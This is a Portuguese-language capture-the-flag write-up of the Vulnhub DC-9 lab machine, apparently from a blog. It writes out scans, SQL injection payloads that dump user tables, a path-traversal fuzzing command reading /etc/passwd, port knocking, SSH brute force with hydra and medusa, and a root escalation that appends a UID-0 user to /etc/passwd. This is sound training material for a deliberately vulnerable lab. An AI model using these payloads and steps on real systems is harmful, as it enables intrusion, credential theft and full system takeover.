---
title: Vulnhub DC-9
categories: [Vulnhub]
tags: [SQLInjection,LFI,Port Knocking,BruteForce]
---

![](/assets/img/Vulnhub/DC-9/capa.png
)
Link da maquina: <https://www.vulnhub.com/entry/dc-9,412/>


# Scan/Enumeracao

## Host Discovery

* Vamos varrer a rede em busca da nossa maquina alvo

```bash
sudo arp-scan -I eth1 192.168.150.0/24
```

![](/assets/img/Vulnhub/DC-9/arp-scan.png)


## Port Discovery

* Descobrindo as portas abertas na maquina alvo. Com o parametro "-p-" estamos escaneando todas as portas possiveis

```bash
sudo nmap -n -T5 -p- 192.168.150.111
```

![](/assets/img/Vulnhub/DC-9/port-discovery.png)

\newpage

## Port Scan

* Com as informacoes coletadas no passo anterior vamos escanear as portas abertas com o objetivo de descobrir quais sao os servicos e seus suas respectivas versoes

```bash
sudo nmap -n -T5 -A -p 22,80 192.168.150.111
```

![](/assets/img/Vulnhub/DC-9/port-scan.png)

> Porta 22: Filtered

> Porta 80: Apache httpd 2.4.38 ((Debian))

\newpage

# Exploracao

## Web

* Acessando a pagina pelo browser

![](/assets/img/Vulnhub/DC-9/web1.png)

> A primeira vista parece ser um sistema de cadastro de funcionarios de uma empresa. O qual armazena o nome, cargo, telefone, email e cada usuario possui um numero sequencial como ID

> Nao tem nada no codigo fonte

\newpage

### Fuzzy de diretorios

* Vamos fazer um fuzzy de diretorios com o gobuster para descobrir os diretorios que ainda nao conhecemos

```bash
gobuster dir -u http://192.168.150.111/ -w /usr/share/wordlists/dirb/big.txt -x php,js
```

![](/assets/img/Vulnhub/DC-9/gobuster1.png)

> Mesmo utilizando outras listas e varrendo os diretorios recursivamente nao encontramos nada demais com o fuzzy


\newpage

### SQLInjection

* Na aba "Search" tem um campo para buscar cadastro no Bando de Dados pelo nome do funcionario

![](/assets/img/Vulnhub/DC-9/search-1.png)


\newpage

* Com um nome de usuario valido no sistema, podemos testar se a pagina esta vulneravel a SQLi

![](/assets/img/Vulnhub/DC-9/sqli-1.png)

> Usamos aspas simples para fechar a query e comentamos o restante do codigo para testar se a aplicacao vai aceitar. Como pode ser visto na imagem a aplicacao nao tratou a vulnerabilidade.

* Sabendo que a aplicacao e vulneravel a SQLi entao vamos explora-la

* Primeiramente vamos abrir o Burp Suite e interceptar o trafego web. O SQLi pode ser feito, tambem, pelo navegador, porem sera mais dificil para a visualizacao.

![](/assets/img/Vulnhub/DC-9/sqli-burp.png)

> Vamos mandar para o repeater. Basta clicar em *"Actions"* -> *"Send to Repeater"* ou basta apertar CTRL+R


\newpage

* Ja na aba "Repeater" conseguimos interagir com a aplicacao e testar o SQLInjection mais facilmente. **Primeiramente, para verificarmos quantas colunas tem na tabela que esta sendo feita a consulta da aplicacao, utilizamos o comando sql "order by"

```bash
search=Fred' order by 6 #
```

![](/assets/img/Vulnhub/DC-9/order-by.png)

> Utizamos o comando "order by 6" pois testamos manualmente e iniciando com 1 e  adicionando +1 a cada consulta. Quando utilizamos o "order by 7" a consulta nao foi exibida, ou seja, nao exite a setima coluna na tabela


\newpage

* Vamos testar quais sao os campos que podemos evadir as informacoes 

```bash
search=Fred' union select 1,2,3,4,5,6 #
```

![](/assets/img/Vulnhub/DC-9/campos-evasao.png)


\newpage

* Vamos levantar algumas informacoes sobre o DB. **Versao do SGBD, usuario e banco de dados que esta sendo usado**

```bash
search=Fred' union select 1,2,3,version(),user(),database() #
```

![](/assets/img/Vulnhub/DC-9/dados-db.png)


\newpage

* Listando os banco de dados existentes: **information_schema**, **Staff** e **users**

```bash
search=Fred' union select 1,2,3,4,5,table_schema from information_schema.columns #
```

![](/assets/img/Vulnhub/DC-9/listagem-dbs.png)


\newpage

* Listando as tabelas do banco de dados que esta sendo usado: **StaffDetails** e **Users**

```bash
search=Fred' union select 1,2,3,4,5,table_name from information_schema.columns where table_schema = database() #
```

![](/assets/img/Vulnhub/DC-9/tabelas-staff.png)


\newpage

* Listando as colunas da tabela "Users": **UserId**, **Username** e **Password**

```bash
search=Fred' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'Users' #
```

![](/assets/img/Vulnhub/DC-9/colunas-Users.png)


* Conseguimos extrair o conteudo da tabela Users. 

```bash
search=Fred' union select UserID,Username,Password,4,5,6 from Staff.Users #
```

![](/assets/img/Vulnhub/DC-9/info-Users.png)

> admin:856f5de590ef37314e7c3bdf6f8a66dc


\newpage

* Agora vamos extrair as informacoes do outro db, **"users"**. Primeiramente listando as tabelas. Temos somente a tabela **UserDetails**

```bash
search=Fred' union select 1,2,3,4,5,table_name from information_schema.columns where table_schema = 'users' #
```

![](/assets/img/Vulnhub/DC-9/tabelas-users.png)


\newpage

* Listando as colunas da tabela UserDetails: **ID**, **firstname**, **lastname**, **username**, **password** e **reg_date**

```bash
search=Fred' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'UserDetails' #
```

![](/assets/img/Vulnhub/DC-9/colunas-UserDetails-users.png)


\newpage

* Extraindo as informacoes (username e password) da tabela UserDetails

```bash
search=Fred' union select 1,username,password,4,5,6 from users.UserDetails #
```

![](/assets/img/Vulnhub/DC-9/info_UserDetails.png)

> marym:3kfs86sfd; julied:468sfdfsd2; fredf:4sfd87sfd1; barneyr:RocksOff; tomc:TC&TheBoyz; jerrym:B8m#48sd; wilmaf:Pebbles; bettyr:BamBam01; chandlerb:UrAG0D!; joeyt:Passw0rd; rachelg:yN72#dsd; rossg:ILoveRachel; monicag:3248dsds7s, phoebeb:smellycats; scoots:YR3BVxxxw87; janitor:Ilovepeepee; janitor2:Hawaii-Five-0


\newpage

### Logando na Aplicacao

* Apos enumerarmos todas as informacoes possiveis no bando de dados por meio de SQLi, vamos tentar logar com as credenciais que achamos. Foram feitos alguns testes com os usuarios e as senhas dos funcionarios que encontramos no "UserDetails", poremo nao tivemos sucesso em nenhuma tentativa


* Lembra do username admin e o hash que estava no campo password. Vamos tentar quebrar aquele hash para ver onde pode nos levar

![](/assets/img/Vulnhub/DC-9/hashes.com.png)

> admin:transorbital1


\newpage

* Conseguimos logar na aplicacao com a senha que encontramos. Uma coisa nos chama atencao apos o login, logo em baixo tem uma mensagem de "File does not exist", o que nos faz crer que a aplicacao esta tentando chamar um arquivo, o qual ela nao encontrou.

![](/assets/img/Vulnhub/DC-9/login-admin.png)


\newpage

### LFI


* Sabendo que a aplicacao esta tentando buscar um arquivo, podemos tentar um LFI. Porem nao sabemos qual e o parametro para podermos passar na URL. Entao vamos fazer um bruteforce para descobrir o parametro e se a aplicacao e vulneravel a LFI

```bash
wfuzz -c --hw 78 -b PHPSESSID=af98686t7fb2avab1kplgu2kp8 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -u http://192.168.150.111/welcome.php?FUZZ=../../../../../../../../../../etc/passwd
```

![](/assets/img/Vulnhub/DC-9/parametro-file.png)

> -c: Para a saida ficar colorida; --hw 78: Nao mostrar as tentativas que tem o 78, nesse caso foram as que nao deram certo; -b: E a opcao para colocarmos o cookie, uma vez que estamos logados como admin, se nao passar esse parametro nao ira funcionar; -w: E a wordlist, neste caso utilizamos uma especifica para parametros; -u: Para colocarmos a URL


\newpage

* Agora que sabemos qual e o parametro vamos tentar acessar o /etc/passwd com o Path Transversal

![](/assets/img/Vulnhub/DC-9/lfi-1.png)

 
* Vamos utilziar o Burp Suite para otimizar a nossa exploracao do LFI


\newpage

## Port Knocking


* Depois de varias tentativas nao conseguimos sair do lugar. Pensando com calma, no scan tinhamos a porta 80 aberta e a 22 que estava como "filtered", pode ser que ela esteja bloqueada... Pesquisando, achamos alguns sites que explicam o **"port knocking"**, que resumidamente e uma forma de bloquear uma porta que nao precisa ficar 100% disponivel. Para desbloquear essa porta e necessario interagir com uma sequenia de outras portas.


* Podemos verificar se o port knocking esta sendo usado vendo os processos da maquina. Para isso vamos ler o arquivo **/proc/sched_debug**

![](/assets/img/Vulnhub/DC-9/processos-knockd.png)


\newpage

* Ja que agora sabemos que o knockd esta rodando na maquina, vamos verificar o arquivo de configuracao desse servico em **/etc/knockd.conf**

![](/assets/img/Vulnhub/DC-9/knockd-conf.png)

> Para abrir: 7469,8475 e 9842

> Para fechar: 9842,8475 e 7469


\newpage

* Interagindo com as portas para abrir a 22

![](/assets/img/Vulnhub/DC-9/knock-open22.png)

> Para ficar mais didatico escaniei a porta 22 depois fiz o knock na sequencia de portas e depois escaniei novamente a 22 pra mostrar que ela abriu



\newpage

## SSH


* Agora que temos a porta do SSH aberta podemos tentar logar nela com as credenciais que achamos na exploracao do SQLi. Primeiro temos que trabalhar na nossa lista de usuarios e senhas

![](/assets/img/Vulnhub/DC-9/credenciais-1.png)

![](/assets/img/Vulnhub/DC-9/credenciais-2.png)


\newpage

### Bruteforce


* Agora vamos tentar um **bruteforce** com o **hydra** o **SSH** com as informacoes que temos 

```bash
sudo hydra -L usuarios.txt -P senhas.txt ssh://192.168.150.112 -T50
```

![](/assets/img/Vulnhub/DC-9/hydra-ssh.png)

> **chandlerb:UrAG0D!** ; **joeyt:Passw0rd** ; **janitor:Ilovepeepee**


### Acesso SSH


* Vamos acessar via ssh com uma das credenciais que nos conseguimos no bruteforce

```bash
ssh joeyt@192.168.150.112
```

![](/assets/img/Vulnhub/DC-9/ssh-joeyt.png)


\newpage

# Escalando Privilegio

## Arquivos e Diretorios


* Seguindo a metodologio para escalacao de privilegio vamos procurar por diretorios com permissao de escrita, arquivos com permissao de escrita e arquivos com SUID

```bash
find / -type d -writable 2> /dev/null | fgrep -v proc
find / -type f -writable 2> /dev/null | fgrep -v proc
find / -type f -perm -4000 2> /dev/null | fgrep -v proc
```


* Como um dos nossos vetores de entrada na maquina foi web cresce a importancia de darmos uma olhada no diretorio de configuracao **/var/www/html**

![](/assets/img/Vulnhub/DC-9/var-www-html.png)


\newpage

* Vamos dar uma olhada na pagina de configuracao da aplicacao **config.php**

![](/assets/img/Vulnhub/DC-9/config-php.png)

> Conseguimos achar as credenciais para acessarmos o bando de dados **dbuser:password**


## MySQL


* Conseguimos acessar o banco de dados

![](/assets/img/Vulnhub/DC-9/mysql.png)


* Verificando as informacoes do banco de dados Staff observamos que existem dois desses usuarios que foram adicionados em datas diferentes dos demais

![](/assets/img/Vulnhub/DC-9/mysql-info.png)


\newpage

* Verificando os usuarios da maquina la estao os dois usuarios que plotamos. Lembra das 03 credenciais que conseguimos no bruteforce do SSH, umas delas e do usuario **Donald Trump**: **janitor:Ilovepeepee**

![](/assets/img/Vulnhub/DC-9/donald-trump.png)


## Usuario "janitor"


* Trocando de usuario

![](/assets/img/Vulnhub/DC-9/janitor.png)


* Seguindo a metodologia ao verificar os arquivos que temos permissao de escrita plotamos um arquivos diferente **passwords-found-on-post-it-notes.txt**

![](/assets/img/Vulnhub/DC-9/arquivo-janitor.png)


* O nome do arquivo nos dis que sao senhas encontradas em um post. Lendo o arquivo temos algumas senhas que possivelmente podem ser usadas por outros usuarios

![](/assets/img/Vulnhub/DC-9/passwords-janitor.png)



\newpage

## Bruteforce SSH


* Vamos tentar descobrir se alguma dessas senhas e de algum daqueles usuarios que encontramos no inicio

```bash
medusa -h 192.168.150.112 -U usuarios.txt -P passwords-found-on-post-it-notes.txt -M ssh 
```

> Encontramos as seguintes correspondencias: **fredf:B4-Tru3-001** e **joeyt:Passw0rd**

> O usuario joeyt ja tinhamos encontrado no primeiro bruteforce, ja o fredf nao tinhamos encontrado. E para quem tem uma boa memoria, quando exploramos a pagina web o usuario **fredf** era o **Administrador de Sistemas** 


## Usuario "fredf"


* Logando com o usuario "fredf"

![](/assets/img/Vulnhub/DC-9/fredf.png)


* Seguindo a metodologia, ao listar o que o usuario pode fazer como sudo encontramos algo interessante

![](/assets/img/Vulnhub/DC-9/sudo -l-fredf.png)


\newpage

* Varrendo os diretorios do binario e os anteriores encontramos o arquivos **test.py**. Ao ler ele e possivel imaginar que o binario ao executar o mesmo pode escrever em um arquivo

![](/assets/img/Vulnhub/DC-9/test-py.png)


\newpage

## Adicionando um usuario


* Como ja sabemos que podemos utilizar o binario test como sudo e o binario pode escrever em um arquivo... Entao vamos adidionar um usuario no /etc/passwd com os mesmos privilegios do root

```bash
openssl passwd thelifesnake
echo "charlie:pFBA1KAF/n7DA:0:0:Charlie:/root:/bin/bash" >> charlie.txt
sudo /opt/devstuff/dist/test/test charlie.txt /etc/passwd
```

![](/assets/img/Vulnhub/DC-9/charlie-add.png)

> O comando openssl serve para codificarmos a senha no formato que o passwd aceita

> Com o comando echo adicionamos uma linha com a mesma formatacao do passwd para um arquivo "charlie.txt"

> Por ultimo executamos o binario test como sudo e adicionamos o conteudo do arquivo "charlie.txt" para o arquivo "/etc/passwd"


## Virando root

* Agora e so logar com o usuario charlie e se tivermos feito tudo certo seremos **root**

![](/assets/img/Vulnhub/DC-9/root-porra.png)


\newpage

# Flag

* Conseguimos pegar a **flag**

![](/assets/img/Vulnhub/DC-9/flag.png)
